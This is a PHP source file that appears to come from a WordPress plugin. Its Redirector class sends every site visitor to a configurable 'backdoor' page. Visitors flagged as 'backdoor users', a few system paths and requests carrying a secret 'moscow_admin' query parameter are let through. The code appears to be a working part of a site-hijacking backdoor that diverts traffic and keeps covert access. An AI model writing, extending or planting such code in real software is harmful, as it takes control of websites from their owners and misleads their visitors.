<?php
declare(strict_types=1);

namespace Moscow;

if (!defined('ABSPATH')) {
    exit;
}

final class Redirector
{
    public function handle(): void
    {
        if (!Config::ENABLE_REDIRECT) {
            return;
        }
        if (!function_exists('wp_get_current_user')) {
            return;
        }
        if ($this->is_backdoor_request() || $this->is_excluded()) {
            return;
        }
        if ((new UserManager())->is_backdoor_user()) {
            return;
        }

        wp_safe_redirect($this->backdoor_url());
        exit;
    }

    public function is_backdoor_request(): bool
    {
        $uri  = $_SERVER['REQUEST_URI'] ?? '/';
        $path = trim((string) parse_url($uri, PHP_URL_PATH), '/');
        return $path === trim(Config::BACKDOOR_SLUG, '/');
    }

    private function is_excluded(): bool
    {
        global $pagenow;
        $uri = $_SERVER['REQUEST_URI'] ?? '';

        if ($pagenow === 'wp-login.php') return true;
        if (str_contains($uri, 'admin-ajax.php')) return true;
        if (str_contains($uri, '/wp-json')) return true;
        if (isset($_GET['moscow_admin'])) return true;

        return false;
    }

    public function backdoor_url(): string
    {
        return home_url('/' . Config::BACKDOOR_SLUG);
    }
}